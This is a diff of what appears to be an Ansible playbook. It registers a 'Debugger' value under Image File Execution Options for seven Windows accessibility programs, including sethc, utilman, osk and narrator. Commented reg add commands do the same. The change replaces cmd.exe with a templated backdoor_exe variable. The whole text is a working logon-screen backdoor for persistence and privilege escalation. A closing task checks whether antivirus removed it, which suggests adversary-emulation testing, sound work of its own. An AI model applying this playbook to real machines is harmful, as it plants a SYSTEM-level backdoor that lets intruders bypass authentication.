@@ -10,7 +10,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string
           - name: Attaches Command Prompt As Debugger To Process - sethc
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -18,7 +18,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string
           - name: Attaches Command Prompt As Debugger To Process - utilman
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -26,7 +26,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string          
           - name: Attaches Command Prompt As Debugger To Process - magnify
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -34,7 +34,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string     
           - name: Attaches Command Prompt As Debugger To Process - narrator
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -42,7 +42,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string
           - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -50,7 +50,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string     
           - name: Attaches Command Prompt As Debugger To Process - atbroker
             #reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
@@ -58,7 +58,7 @@
             win_regedit:
               path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe
               name: Debugger
-              data: 'C:\windows\system32\cmd.exe'
+              data: {{ backdoor_exe }}
               type: string    
           - name: sleep for 10 seconds and continue with play to check if AV removed or Not
             tags: always
